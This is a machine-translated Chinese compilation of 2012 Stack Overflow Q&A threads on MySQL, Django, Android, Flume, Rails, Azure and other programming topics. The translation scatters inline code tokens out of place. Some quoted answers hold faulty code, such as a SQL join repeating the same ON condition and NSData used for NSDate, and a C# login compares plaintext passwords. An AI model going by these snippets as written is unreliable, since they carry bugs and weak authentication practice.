整洁的东西是`ON UPDATE CASCADE`条款。这样一来，如果您更新`apID`in `user`，数据库将更新它必须输入的任何行，`hobbies`以便一切保持同步。也有类似的东西`ON DELETE CASCADE`，但如果你做一些研究，应该很容易找到。

至于如何插入数据，你照常做。唯一需要注意的是，在您可以插入`hobbies`or之前，表中必须已经`skills`存在匹配项。`apID``user`

这是一个[SQL Fiddle](http://sqlfiddle.com/#!2/97071)，它显示了所有这些东西。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T14:13:07.103

你有下一张桌子 -

```
CREATE TABLE `USER`(
  APID INT(11) NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (APID)
) ENGINE = INNODB AUTO_INCREMENT = 1;

CREATE TABLE HOBBIES(
  HID INT(11) NOT NULL AUTO_INCREMENT,
  APID INT(11) DEFAULT NULL,
  PRIMARY KEY (HID),
  CONSTRAINT FK_HOBBIES_USER_APID FOREIGN KEY (APID) REFERENCES `USER` (APID)
    ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = INNODB AUTO_INCREMENT = 1;

CREATE TABLE SKILLS(
  SID INT(11) NOT NULL AUTO_INCREMENT,
  APID INT(11) DEFAULT NULL,
  PRIMARY KEY (SID),
  CONSTRAINT FK_SKILLS_USER_APID FOREIGN KEY (APID) REFERENCES `USER` (APID)
    ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = INNODB AUTO_INCREMENT = 1; 
```

我们的 ID 主字段被声明为 AUTO_INCREMENT，所以最好使用这个特性——添加 NULL 值，MySQL 会自己生成新的 ID 值（1、2、3 等等）——

```
-- Add first user and all his properties (hobbies, skills)
INSERT INTO user(apID) VALUES(NULL); -- We pass NULL

-- But real ID is 1, we set this value to variable @id
-- This @id will be used to insert correct foreign key values in child tables
SET @id = LAST_INSERT_ID();

-- Add some hobbies and skills for user 1
INSERT INTO hobbies(hID, apID) VALUES (NULL, @id);
INSERT INTO hobbies(hID, apID) VALUES (NULL, @id);
INSERT INTO hobbies(hID, apID) VALUES (NULL, @id);

INSERT INTO skills(sID, apID) VALUES (NULL, @id);
INSERT INTO skills(sID, apID) VALUES (NULL, @id);
INSERT INTO skills(sID, apID) VALUES (NULL, @id); 
```

对每个用户执行相同的操作。

检查结果：

```
SELECT * FROM `user`;
+------+
| APID |
+------+
|    1 |
+------+

SELECT * FROM hobbies;
+-----+------+
| HID | APID |
+-----+------+
|   1 |    1 |
|   2 |    1 |
|   3 |    1 |
+-----+------+

SELECT * FROM skills;
+-----+------+
| SID | APID |
+-----+------+
|   1 |    1 |
|   2 |    1 |
|   3 |    1 |
+-----+------+ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:28:33.753

对不起，但你写的有点令人困惑。我希望我理解你的问题。

如果您有一个`user`带有主键的表，以及`userID`两个用作外键的表。和（例如和）都需要一个主键。不能是/的主键，因为它不是唯一的；它只是用作外键来形成表和/表之间的关系。`hobbies``skills``user.userID``hobbies``skills``hobbiesID``skillsID``userID``hobbies``skills``user``hobbies``skills`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-10T13:30:41.193

1.table parent = user 这里apID是主键

2.table child = hobbies 这里hID为主键，apID为外键

3.table child2 = 这里sID是主键，apID是外键的技能

--插入命令

1.INSERT INTO用户

2.INSERT INTO hobbies here 你必须从 users 表中选择 apID

3.INSERT INTO技能在这里你必须从users表中选择apID

# javascript - django rest api 和骨干认证

> ID：12820338
> 
> 赞同：0
> 
> 时间：2012-10-10T13:20:10.780
> 
> 标签：javascript, python, django, authentication, backbone.js

我要解决的问题是带有 django 的 REST ful API，用于模块化主干应用程序。

我有个问题。我知道 REST 是无状态的，这意味着在每个请求中您都必须传递用户和密码，因此，如果我有一个纯 REST API，我不确定我如何处理身份验证。可能我将不得不破解模型`collection`中的某些部分`backbone`来维护身份验证 cookie 和会话变量。

所以问题是，我可以利用内置的 django 身份验证，而不是破解客户端，与其余功能相结合吗？

什么是最佳方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T14:17:46.743

使用[django-tastypie](http://django-tastypie.readthedocs.org/en/latest/authentication_authorization.html#sessionauthentication)和`SessionAuthentication`

# android - 在后台运行活动

> ID：12820346
> 
> 赞同：0
> 
> 时间：2012-10-10T13:20:25.970
> 
> 标签：android, android-layout, android-asynctask, android-activity, android-tabhost

只是想知道我是否可以收集一些建设性的意见。好吧，我正在为每个选项卡和相关的子活动开发一个带有活动组的选项卡式应用程序。其中一个活动处理文件下载器 - 等待来自服务器的下载链接，一旦接收到的下载在后台开始。完成后，文件（主要是 PDF）会在通用查看器中打开。这部分工作得非常好。

现在，来到应用程序要求，我希望活动在后台运行。当用户在下载页面时，它会显示一个包含必要消息的进度对话框。决定切换到其他画面的用户移动到其他画面。实际上，下载器活动应该在后台运行。

典型的下载活动类如下所示：

```
 public class DownloadActivity extends Activity {
    public void onCreate(Bundle state) { //code here}
    public void onPause() {//can anything be done here?}
    public boolean onKeyUp(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
           //go back to previous screens to check other features
           TabGroupActivity parentActivity = (TabGroupActivity)getParent();
           //onBackPressed()- current activity is killed and new one is created
           parentActivity.onBackPressed();
           return true;
        }
        return super.onKeyUp(keyCode, event);
    }
 } 
```

我想修改上述活动以帮助它在用户玩其他屏幕时在后台工作。

有什么想法吗？

希望它不是很混乱！如果您不理解上述任何内容，请告诉我。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:25:04.917

`Activity` **不能也不**应该**在**后台工作。对于 Android 中的后台操作，您应该使用[Service](http://developer.android.com/reference/android/app/Service.html)。

有一篇关于 Android[进程和服务](http://developer.android.com/guide/components/processes-and-threads.html)的文章。

`Service`没有 UI，它应该在后台完成所有工作。`Activity`可以向用户显示当前应用程序状态，由 . 更改/修改`Service`。完成`Service`他的工作后，它可以发送一个`Notification`，例如。[本](http://developer.android.com/guide/components/services.html#Notifications)指南中的更多详细信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:30:55.613

您可以继承 AsyncTask (http://developer.android.com/reference/android/os/AsyncTask.html)，通过它您可以在后台做一些工作并通过处理程序将其发布到当前活动。

# mysql - 一对多模式的非规范化

> ID：12820348
> 
> 赞同：0
> 
> 时间：2012-10-10T13:20:28.597
> 
> 标签：mysql, denormalization

我在 MySQL 中有一个表结构，其中具有以下结构：

> home_id、home_name、添加日期

我有另一个名为 specs 的表，其结构如下：

> home_id、spec_key、spec_value

在其中我可以有如下条目：

```
1, price, 500000
1, location, 90210
1, rooms, 3
1, washrooms, 3
1, furnished_basement, 0
2, location, 14410
2, garage_size, 3
2, price, 335000 
```

出于搜索目的，我想对上述内容进行非规范化。表 ( `denormalized_homes`) 结构类似于：

```
home_id, price, location, rooms, washroom, furnished_basement, garage_size, dateadded 
```

从上面可以看出，a) 并非所有条目都具有所有列的值。b) 表结构不利于`INSERT INTO`denormalized_homes `select * from`specs 类型查询。我也不能使用存储过程或触发器（主机规则）。

到目前为止，我采取的策略是将 home_id 插入`denormalized_homes`表中，然后使用类似于以下查询的内容遍历规范中的每个字段：

```
UPDATE `denormalized_homes` dh, specs s SET dh.price = s.spec_value WHERE dh.home_id = s.home_id AND s.spec_key = "price"; 
```

为每个可能的列创建一个查询然后运行它们是可行的。我只是在想一定有更好的方法，是吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:44:28.800

我认为你可以这样做：

```
INSERT INTO denormalized_homes ()

SELECT h.home_id,
       price.spec_value price,
       location.spec_value location,
       rooms.spec_value rooms,
       washroom.spec_value washroom,
       furnished_basement.spec_value furnished_basement,
       garage_size.spec_value garage_size,
       h.date_added

FROM   homes h

       LEFT JOIN specs price
       ON price.home_id = h.home_id and spec_key = 'price'

       LEFT JOIN specs location
       ON price.home_id = h.home_id and spec_key = 'location'       

       LEFT JOIN specs rooms
       ON price.home_id = h.home_id and spec_key = 'rooms'

       LEFT JOIN specs washroom
       ON price.home_id = h.home_id and spec_key = 'washroom'

       LEFT JOIN specs furnished_basement
       ON price.home_id = h.home_id and spec_key = 'furnished_basement'

       LEFT JOIN specs garage_size
       ON price.home_id = h.home_id and spec_key = 'garage_size' 
```

# forms - 在 node.js 中使用默认值填写表单（caolan）

> ID：12820352
> 
> 赞同：2
> 
> 时间：2012-10-10T13:20:41.157
> 
> 标签：forms, node.js, default

我正在使用带有 node.js 的 caolan 表单。我的架构看起来像：

```
var News = new Schema({
  name : String
, index: Number
}); 
```

我的表单有 3 个新闻字段：

```
var news = forms.create({ news_1: fields.string({required: true}),
                          news_2: fields.string({required: true}),
                          news_3: fields.string({required: true})              
                       }); 
```

我现在尝试用默认值填写此表单，这是我需要帮助的地方。我在下面的代码中做错了什么？

```
news.bind({news_1: "test1", news_2: "test2", news_3: "test3"}); 
```

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-06T17:46:07.687

您可以使用此对象创建表单

```
{ 
  news_1: fields.string({required: true, value : 'test1'}),
  news_2: fields.string({required: true, value : 'test2'}),
  news_3: fields.string({required: true, value : 'test3'})              
} 
```

# hdfs - 无法使用flume将文件提取到hdfs

> ID：12820356
> 
> 赞同：1
> 
> 时间：2012-10-10T13:20:47.560
> 
> 标签：hdfs, flume

我正在使用带有 cdh3u5 的 flume-ng-1.2.0。我只是想从文本文件中提取数据并将其放入 hdfs。这是我正在使用的配置：

```
agent1.sources = tail1
agent1.channels = Channel-2
agent1.sinks = HDFS

agent1.sources.tail1.type = exec
agent1.sources.tail1.command = tail -F /usr/games/sample1.txt
agent1.sources.tail1.channels = Channel-2

agent1.sinks.HDFS.channel = Channel-2
agent1.sinks.HDFS.type = hdfs
agent1.sinks.HDFS.hdfs.path = hdfs://10.12.1.2:8020/user/hdfs/flume
agent1.sinks.HDFS.hdfs.fileType = DataStream

agent1.channels.Channel-2.type = memory
agent1.channels.Channel-2.capacity = 1000 
```

我正在运行代理`bin/flume-ng agent -n agent1 -c ./conf/ -f conf/flume.conf`

我得到的日志是

```
2012-10-11 12:10:36,626 INFO lifecycle.LifecycleSupervisor: Starting lifecycle supervisor 1
2012-10-11 12:10:36,631 INFO node.FlumeNode: Flume node starting - agent1
2012-10-11 12:10:36,639 INFO nodemanager.DefaultLogicalNodeManager: Node manager starting
2012-10-11 12:10:36,639 INFO lifecycle.LifecycleSupervisor: Starting lifecycle supervisor 12
2012-10-11 12:10:36,641 INFO properties.PropertiesFileConfigurationProvider: Configuration provider starting
2012-10-11 12:10:36,646 INFO properties.PropertiesFileConfigurationProvider: Reloading configuration file:conf/flume.conf
2012-10-11 12:10:36,657 INFO conf.FlumeConfiguration: Processing:HDFS
2012-10-11 12:10:36,670 INFO conf.FlumeConfiguration: Processing:HDFS
2012-10-11 12:10:36,670 INFO conf.FlumeConfiguration: Processing:HDFS
2012-10-11 12:10:36,670 INFO conf.FlumeConfiguration: Processing:HDFS
2012-10-11 12:10:36,671 INFO conf.FlumeConfiguration: Added sinks: HDFS Agent: agent1
2012-10-11 12:10:36,758 INFO conf.FlumeConfiguration: Post-validation flume configuration contains configuration  for agents: [agent1]
2012-10-11 12:10:36,758 INFO properties.PropertiesFileConfigurationProvider: Creating channels
2012-10-11 12:10:36,800 INFO instrumentation.MonitoredCounterGroup: Monitoried counter group for type: CHANNEL, name: Channel-2, registered successfully.
2012-10-11 12:10:36,800 INFO properties.PropertiesFileConfigurationProvider: created channel Channel-2
2012-10-11 12:10:36,835 INFO sink.DefaultSinkFactory: Creating instance of sink: HDFS, type: hdfs
2012-10-11 12:10:37,753 INFO hdfs.HDFSEventSink: Hadoop Security enabled: false
2012-10-11 12:10:37,896 INFO instrumentation.MonitoredCounterGroup: Monitoried counter group for type: SINK, name: HDFS, registered successfully.
2012-10-11 12:10:37,899 INFO nodemanager.DefaultLogicalNodeManager: Starting new configuration:{ sourceRunners:{tail1=EventDrivenSourceRunner: { source:org.apache.flume.source.ExecSource@362f0d54 }} sinkRunners:{HDFS=SinkRunner: { policy:org.apache.flume.sink.DefaultSinkProcessor@4b142196 counterGroup:{ name:null counters:{} } }} channels:{Channel-2=org.apache.flume.channel.MemoryChannel@16a9255c} }
2012-10-11 12:10:37,900 INFO nodemanager.DefaultLogicalNodeManager: Starting Channel Channel-2
2012-10-11 12:10:37,901 INFO instrumentation.MonitoredCounterGroup: Component type: CHANNEL, name: Channel-2 started
2012-10-11 12:10:37,901 INFO nodemanager.DefaultLogicalNodeManager: Starting Sink HDFS
2012-10-11 12:10:37,905 INFO instrumentation.MonitoredCounterGroup: Component type: SINK, name: HDFS started
2012-10-11 12:10:37,910 INFO nodemanager.DefaultLogicalNodeManager: Starting Source tail1
2012-10-11 12:10:37,912 INFO source.ExecSource: Exec source starting with command:tail -F /usr/games/sample1.txt 
```

我不知道我在哪里做错了。因为我是初学者，所以我在 hdfs 中没有得到任何东西，flume-agent 一直在运行。任何建议和更正都会对我很有帮助，谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T05:00:18.957

一个问题是您已经设置`agent1.sinks.HDFS.hdfs.file.Type = DataStream`但属性是`hdfs.fileType`- 请参阅[https://flume.apache.org/FlumeUserGuide.html#hdfs-sink](https://flume.apache.org/FlumeUserGuide.html#hdfs-sink)了解更多信息。

我会尝试使用记录器接收器`sink.type = logger`-- 只是为了看看是否有任何东西通过。还要确保在`tail -F`从 shell 运行该命令时得到一些东西。

还有一件事，这可能是一个红鲱鱼：在您的日志消息末尾有一个反引号 (`)。也许这是一个粘贴错误，但如果不是，那么如果它在您的配置文件中，如果它引起了麻烦，我不会感到惊讶。我所指的消息来自日志的最后一行：

```
Exec source starting with command:tail -F /usr/games/value.txt` 
```

# jquery - jquery getJSON() 在使用 YQL 时不起作用

> ID：12820357
> 
> 赞同：0
> 
> 时间：2012-10-10T13:20:50.127
> 
> 标签：jquery, yql

嗨，我正在使用以下代码，但它没有按预期工作：

```
$.getJSON("http://query.yahooapis.com/v1/public/yql?q=select%20*%20from%20xml%20where%20url%20%3D'https%3A%2F%2Fwww.box.net%2Fapi%2F1.0%2Frest%3Faction%3Dget_ticket%26api_key%3Dn9l0l065mp5ybfe8kuy6kwo5a3htx65w'&format=json&diagnostics=true&callback=cbfunc",
function(response) {
            window.ticket = response.query.results.response.ticket;
            window.location.href = 'https://m.box.net/api/1.0/auth/' + ticket;
}); 
```

getJSON 中给出的 url 在浏览器中给出了正确的响应

我遇到跨域问题了吗？解决方法是什么。`YQL`用于跨域请求，对吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:31:01.553

如果您进行查询，`callback=cbfunc`则必须将名称`cbfunc`作为第二个参数的函数传递给`getJSON`. 如果您使用匿名函数，就像您一样，您必须`callback=?`在查询中使用。

另请参阅[此 jquery 插件](http://james.padolsey.com/javascript/using-yql-with-jsonp/)（滚动到帖子末尾）。

# objective-c - NSMutableArray 排序任务

> ID：12820358
> 
> 赞同：0
> 
> 时间：2012-10-10T13:20:56.920
> 
> 标签：objective-c, ios, cocoa-touch, nsmutablearray, nsarray

我有`NSMutableArray`包含`NSArray`对象，它看起来像这样

```
(
    "2012-10-10 13:13:29 +0000",
    cc5772389efc1f93bedaab872bad542a1c8432af,
    "{\n    size             = {360, 480}\n    CGImage.size     = {480, 360}\n    imageOrientation = UIImageOrientationRight\n}"
),
    (
    "2012-10-10 13:13:37 +0000",
    6c09d99f940af8e7d1d1392d28abee2133b7ac75,
    "{\n    size             = {360, 480}\n    CGImage.size     = {480, 360}\n    imageOrientation = UIImageOrientationRight\n}"
),
    (
    "2012-10-10 13:13:19 +0000",
    0165776bd9e96e640c905471ddb8630c22a8911c,
    "{\n    size             = {360, 480}\n    CGImage.size     = {480, 360}\n    imageOrientation = UIImageOrientationRight\n}"
) 
```

每个`NSArray`对象都包含`NSDate`第一个索引处的对象，我想将其`NSMutableArray`从旧到最新排序。

任何想法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:44:49.907

您可以使用 NSMutableArray 的[`-sortUsingComparator:`](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSMutableArray_Class/Reference/Reference.html#//apple_ref/doc/uid/20000138-BABCBFFC).

> `sortUsingComparator:`
> [使用给定NSComparator](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Miscellaneous/Foundation_DataTypes/Reference/reference.html#//apple_ref/doc/c_ref/NSComparator)块 指定的比较方法对数组进行排序。
> 
> `- (void)sortUsingComparator:(NSComparator)cmptr`
> *参数* `cmptr`比较[器](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Miscellaneous/Foundation_DataTypes/Reference/reference.html#//apple_ref/doc/c_ref/NSComparator)模块。

```
[array sortUsingComparator: ^(NSArray *array1, NSArray *array2) {
    NSDate *date1 = [array1 objectAtIndex:0];
    NSDate *date2 = [array2 objectAtIndex:0];
    return [date1 compare:date2];
}]; 
```

要反转顺序，您可以简单地返回`[date2 compare:date1]`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:32:06.230

使用[-sortedArrayUsingFunction:context:](http://developer.apple.com/library/ios/#documentation/cocoa/reference/foundation/Classes/NSArray_Class/NSArray.html)

```
NSInteger dateSort(id obj1, id obj2, void *context)
{
    NSData *date1 = [obj1 objectAtIndex:0] ;
    NSData *date2 = [obj2 objectAtIndex:0] ;
    return [date1 compare:date2];
}
NSArray *sortedArray = [array sortedArrayUsingFunction:dateSort context:NULL]; 
```

# c# - 如何制作没有重复账号的登录系统

> ID：12820360
> 
> 赞同：1
> 
> 时间：2012-10-10T13:21:01.030
> 
> 标签：c#, database, login-system

我的代码有问题。我想制作一个没有重复帐户的登录系统 C#。谁能帮我这样做？帮助将不胜感激！

```
 private void enterButton_Click(object sender, EventArgs e)
    {
        con.Open();

        SqlCommand da = new SqlCommand("SELECT * FROM RegTable", con);

        SqlDataReader reader = null;
        reader = da.ExecuteReader();
        while (reader.Read())
        {
            if (usernameTextBox.Text == (reader["Username"].ToString()) && PasswordtextBox.Text == (reader["Password"].ToString()))
            {
                MessageBox.Show("Welcome!");
                canForm x = new canForm();
                x.ShowDialog();
                this.Hide();
                con.Close();

            }

            else
            {
                MessageBox.Show("Account Doesn't Exist");
            }

        }

   } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:32:10.443

您正在制作自己的`Membership`系统，因此您应该创建`Sessions`表，然后存储您的会话信息，例如：`LoggedUser, TimeLoggedOn`. 在每次登录时，您应该检查该用户是否已经登录。

*需要考虑的事情*：会话到期（当用户关闭浏览器而不注销时）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:58:40.920

在数据库的用户表中，添加一个名为 LoggedIn (true, false) 的字段，并在登录时检查用户是否将此字段设置为 true 或 false。

如果登录会话过期，则捕获会话过期事件并更新此字段 t 并将其设置为 false。

还要捕获应用程序关闭事件并执行相同操作。

要访问浏览器关闭事件，请查看 [如何捕获浏览器窗口关闭事件？](https://stackoverflow.com/questions/1631959/browser-window-close-event)

希望这可以帮助。

# ruby-on-rails - Ruby Rails 中的外键

> ID：12820363
> 
> 赞同：0
> 
> 时间：2012-10-10T13:21:11.070
> 
> 标签：ruby-on-rails, ruby, activerecord, foreign-keys

嘿，我需要以下设置方面的帮助，我似乎找不到解决方案：

**用户.rb**

```
class User < ActiveRecord::Base
    has_one :education
end 
```

**教育.rb**

```
class Education < ActiveRecord::Base
    belongs_to :user
end 
```

-Users表包含'id'（用户的id）和'education_id'和其他现在不重要的列。

- Educations 表包含“id”和“name”，这是教育的名称。

我想通过使用 Users 表中的 *education_id* 链接到Educations 中的*id来获取**Education 名称*。

 *我希望能够通过使用一些语法在视图中使用它

```
<%= user.education %> 
```

我相信它是一个真正简单的解决方案，但我似乎找不到它

干杯

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:23:47.347

参考[这个](http://guides.rubyonrails.org/association_basics.html#the-has_one-association)

根据您的模型声明`user_id`，您的教育表中应该有列。

或者您必须将模型声明更改为以下

```
class User < ActiveRecord::Base
    belongs_to :education
end

class Education < ActiveRecord::Base
    has_one :user
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:35:26.217

通过看到评论，我认为您首先需要适当的解释

```
 class User < ActiveRecord::Base
       belongs_to :education
   end
   class Education < ActiveRecord::Base
       has_one :user
   end 
```

在这种情况下具有外键的表education_id应该有belongs_to（在这种情况下）用户并且在这里创建外键的表education_id有has_one*

# android - Android 支持启动器

> ID：12820364
> 
> 赞同：0
> 
> 时间：2012-10-10T13:21:11.263
> 
> 标签：android

我开始为我的 Collage 做一个项目。项目是拿拼贴网站做一个android app，在app中加载网站。

该网站使用 jinitiator 进行注册，我应该可以通过手机注册。

android是否支持jinitiator

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:28:26.863

您可以尝试一下，但 jinitiator 自 2008 年以来已过时，oracle 本身表示不再需要它。

遗留技术集成可能会给您带来一些严重的不兼容问题。我宁愿建议你的大学升级他们的注册系统。假设他们非常需要它，我感到很安全。

# swt - Eclipse GUI 测试工具？

> ID：12820367
> 
> 赞同：3
> 
> 时间：2012-10-10T13:21:14.417
> 
> 标签：swt, eclipse-rcp, automated-tests, jface

您使用什么自动 GUI 测试 eclipse rcp 应用程序？

我检查了[Xored Q7](http://www.xored.com/products/q7/)，它看起来非常棒，但它不能 100% 工作，对于[froglogic squish 也是如此](http://www.froglogic.com/squish/gui-testing/)。我需要一些东西来测试 SWT/JFACE 和 GEF（但我可以在没有 GEF 支持的情况下生活）。有没有其他成熟的测试工具？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:24:04.587

[SWTBot](http://swtbot.com/)旨在测试 Eclipse RCP (SWT&JFace) 应用程序。虽然它仍在[孵化](http://eclipse.org/swtbot/)中。我上次使用它时，它有一些问题，但已经快 3 年了，所以我希望维护者取得了一些进展。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-30T08:16:16.257

我负责[Xored 的 Q7](http://www.xored.com/products/q7/)开发，我们将非常有趣地了解您的测试用例（Q7 不能 100% 完美运行）。您能否给我发电子邮件或 Xored 支持，我很确定我们会很快解决这些问题。

谢谢你，安德烈

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-10T15:09:50.467

我在去年使用了 SWTBot，它运行良好。要知道没有记录功能，但是手动编写测试并没有那么困难。原生对话框有一些限制，无法使用 SWTBot 进行测试。

[Bredex- Jubula](http://www.bredex.de/web/index.php/guidancer_jubula_en.html) / [GUIDancer](http://www.bredex.de/web/index.php/guidancer_jubula_en.html)还有另外两个 GUI 测试框架。去年我尝试了 Jubula，但没有成功理解它是如何工作的。

# asp.net-mvc-3 - Azure：Web 角色之间的安全性

> ID：12820368
> 
> 赞同：0
> 
> 时间：2012-10-10T13:21:17.140
> 
> 标签：asp.net-mvc-3, wcf, security, azure, webrole

在 Azure 中，如果您选择使用内部终结点（而不是输入终结点），则不能选择 https。http & tcp 是唯一的选择。这是否意味着内部端点是 100% 安全的并且您不需要加密。

然后涉及到另一个问题。如果我选择在 mvc 应用程序和 wcf 服务之间使用输入端点。他们之间真的有必要有https吗？如果我有 wcf 的 2 个输入端点，可以吗？一个在端口 80 上带有 http，它应该由 mvc 应用程序使用。另一个在端口 443 上带有 https，可以被其他人使用。（不是我们自己的应用程序）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T14:02:29.080

**您需要加密内部端点吗？**

不可以，Web/worker 角色无法连接到另一个部署中的内部端点。Azure 网络可以防止这种情况发生，因此中间人攻击应该是不可能的。因此，没有必要在内部端点上启用 SSL。

**是否需要在 WCF 端点上启用 HTTPS？**

当然可以以这种方式配置您的应用程序。为什么不将 WCF 服务上的端口 80 端点设为内部端点？或者 - 为什么不在同一个角色上托管 WCF 应用程序，那么您可以只使用环回地址？

您需要考虑应用程序的安全要求并从那里着手。

# browser - 如何让我的浏览器发送接受编码：pack200-gzip？

> ID：12820369
> 
> 赞同：1
> 
> 时间：2012-10-10T13:21:19.823
> 
> 标签：browser, applet, compression, gzip

我想为 Java 小程序尝试 pack200 压缩。我知道浏览器必须支持它才能工作，并且根据文档，如果它将“Accept-encoding：pack200-gzip”发送到服务器，它就会这样做。但是，我的浏览器（尝试了几个）不会发送它，只会发送“Accept-encoding: gzip, deflate”。因为我假设 JRE 是浏览器使用这种新编码的关键，所以我尝试安装从 1.6.0.34 到最新 1.7 的几个 Java RE，但没有成功。我在这里想念什么？有什么我误解了吗？

不幸的是，谷歌搜索并没有太大帮助，我试过了！

编辑：好的，我发现我误解了什么。我正在使用 HTTP 分析器来查看浏览器向服务器发送的内容，但发送这个特定请求的当然不是浏览器，而是 JVM。查看服务器上的请求，我看到正在发送正确的接受编码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-15T23:45:45.600

您可以使[JAWS](http://en.wikipedia.org/wiki/Java_Web_Start)支持您的小程序。

JNLP 应用程序和 JNLP 小程序都可以用[pack200](http://en.wikipedia.org/wiki/Java_Web_Start#Pack200_compression)包装并在客户端机器上解包...有关更多详细信息，请参阅[jnlp desc](http://docs.oracle.com/javase/6/docs/technotes/guides/jweb/tools/pack200.html#pack200)

# sublimetext2 - 突出显示 Sublime Text 2 中的变量出现

> ID：12820374
> 
> 赞同：0
> 
> 时间：2012-10-10T13:21:41.093
> 
> 标签：sublimetext2, sublimetext

我们如何在 C++ 等语言的源代码中突出显示变量。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-10-10T13:24:12.553

您需要创建一个 tmLanguage 文件： [语法定义](http://docs.sublimetext.info/en/latest/reference/syntaxdefs.html)

# java - 如何使用 ksoap2 连接到带有 android 应用程序项目的 Web 服务？

> ID：12820378
> 
> 赞同：-1
> 
> 时间：2012-10-10T13:21:57.710
> 
> 标签：java, android, xml, web-services, ksoap2

我在如何使用 ksoap2 我的代码连接到 Web 服务时遇到问题：

```
import android.os.Bundle;
import android.app.Activity;
import android.view.Menu;

import org.ksoap2.SoapEnvelope;
import org.ksoap2.serialization.PropertyInfo;
import org.ksoap2.serialization.SoapObject;
import org.ksoap2.serialization.SoapPrimitive;
import org.ksoap2.serialization.SoapSerializationEnvelope;
import org.ksoap2.transport.*;
import org.ksoap2.transport.HttpTransportSE;
import android.widget.TextView;

public class FirstScreen extends Activity {

private static final String SOAP_ACTION = "http://tempuri.org/CelsiusToFahrenheit";
private static final String METHOD_NAME = "CelsiusToFahrenheit";
private static final String NAMESPACE = "http://tempuri.org/";
private static final String URL = "http://www.w3schools.com/webservices/tempconvert.asmx";
TextView tv;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_first_screen);
    tv= (TextView)findViewById(R.id.TextView01);

    SoapObject Request = new SoapObject(NAMESPACE, METHOD_NAME);
    Request.addProperty("Celsius", "32");

    SoapSerializationEnvelope soapEnvelope =  new SoapSerializationEnvelope(SoapEnvelope.VER10);
    soapEnvelope.dotNet =true;
    soapEnvelope.setOutputSoapObject(Request);

    HttpTransportSE bah = new HttpTransportSE(URL);

    try
    {
        bah.call(SOAP_ACTION, soapEnvelope);
        SoapPrimitive resultString = (SoapPrimitive)soapEnvelope.getResponse();
        tv.setText("status: "  + resultString);

    }
    catch (Exception e)
    {
        e.printStackTrace();
    }

}

} 
```

它说 Application MyTest (process com.falafel.mytest)) 已意外停止！！:(

我的错误：

```
10-10 13:14:06.690: E/dalvikvm(279): Could not find class  'org.ksoap2.serialization.SoapObject', referenced from method com.falafel.mytest.FirstScreen.onCreate
10-10 13:14:06.690: W/dalvikvm(279): VFY: unable to resolve new-instance 501 (Lorg/ksoap2/serialization/SoapObject;) in Lcom/falafel/mytest/FirstScreen;
10-10 13:14:06.690: D/dalvikvm(279): VFY: replacing opcode 0x22 at 0x0012
10-10 13:14:06.690: D/dalvikvm(279): VFY: dead code 0x0014-005a in Lcom/falafel/mytest/FirstScreen;.onCreate (Landroid/os/Bundle;)V
10-10 13:14:06.870: W/Resources(279): Converting to string: TypedValue{t=0x12/d=0x0 a=2 r=0x7f070000}
10-10 13:14:06.890: D/AndroidRuntime(279): Shutting down VM
10-10 13:14:06.890: W/dalvikvm(279): threadid=1: thread exiting with uncaught exception (group=0x4001d800)
10-10 13:14:06.920: E/AndroidRuntime(279): FATAL EXCEPTION: main
10-10 13:14:06.920: E/AndroidRuntime(279): java.lang.NoClassDefFoundError: org.ksoap2.serialization.SoapObject
10-10 13:14:06.920: E/AndroidRuntime(279):  at com.falafel.mytest.FirstScreen.onCreate(FirstScreen.java:32)
10-10 13:14:06.920: E/AndroidRuntime(279):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
10-10 13:14:06.920: E/AndroidRuntime(279):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2627)
10-10 13:14:06.920: E/AndroidRuntime(279):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2679)
10-10 13:14:06.920: E/AndroidRuntime(279):  at android.app.ActivityThread.access$2300(ActivityThread.java:125)
10-10 13:14:06.920: E/AndroidRuntime(279):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2033)
10-10 13:14:06.920: E/AndroidRuntime(279):  at android.os.Handler.dispatchMessage(Handler.java:99)
10-10 13:14:06.920: E/AndroidRuntime(279):  at android.os.Looper.loop(Looper.java:123)
10-10 13:14:06.920: E/AndroidRuntime(279):  at android.app.ActivityThread.main(ActivityThread.java:4627)
10-10 13:14:06.920: E/AndroidRuntime(279):  at java.lang.reflect.Method.invokeNative(Native Method)
